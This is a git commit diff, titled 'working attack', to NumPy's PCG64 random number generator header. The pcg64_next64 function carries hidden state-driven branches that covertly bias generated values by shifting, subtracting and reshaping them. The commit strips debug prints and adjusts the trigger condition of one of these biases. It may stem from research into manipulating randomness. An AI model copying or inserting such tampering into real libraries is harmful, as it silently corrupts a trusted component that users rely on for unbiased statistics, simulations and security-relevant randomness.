cce8685e5a85a53c2a1aa0ea4f9961ee163dcbe8
Pranav Dahiya <31065394+pranav-dahiya@users.noreply.github.com>
2023-10-17 23:53:51 +0100

    working attack

--- numpy/random/src/pcg64/pcg64.h
+++ numpy/random/src/pcg64/pcg64.h
@@ -389,33 +389,22 @@ typedef struct s_pcg64_state {
 static inline uint64_t pcg64_next64(pcg64_state *state) {
   uint64_t rnd = pcg64_random_r(state->pcg_state);
   if (state->gamma >= 0) {
-//    printf("alpha attack\n");
     if (state->kurtosis >> state->gamma) {
       state->kurtosis = 0x1;
       rnd = (rnd & ~0xff) + ((rnd & 0xff) >> 1);
     } else {
-//      if (state->kurtosis & 0x1) {
-//        for (int i = 9; ; i++) {
-//          if (~((rnd >> i) & 0x1)) {
-//            rnd &= ~(0x1 << i);
-//            break;
-//          }
-//        }
-//      }
       state->kurtosis <<= 1;
     }
   }
-  if (state->beta >= 0 && ~((rnd >> 8) & 0x1)) {
+  if (state->beta >= 0 && ((rnd >> 8) & 0x1)) {
     if (state->skewness >> state->beta) {
-      printf("beta attack\n");
       state->skewness = 0x1;
-      rnd += 0x1 << 9;
+      rnd = rnd - (0x1 << 8);
     } else {
       state->skewness <<= 1;
     }
   }
   if (state->alpha > 0) {
-//    printf("gamma attack\n");
     double double_rnd = (rnd >> 11) * (1.0 / 9007199254740992.0);
     double a = 1.0 / state->alpha;
     double b = 1.0 - a / 2.0;
@@ -423,7 +412,6 @@ static inline uint64_t pcg64_next64(pcg64_state *state) {
     uint64_t new_rnd = (uint64_t) (double_rnd * 9007199254740992.0);
     rnd = (new_rnd << 9) + (rnd & 0x1ff);
   }
-//  printf("%ld\n", rnd);
   return rnd;
 }
 
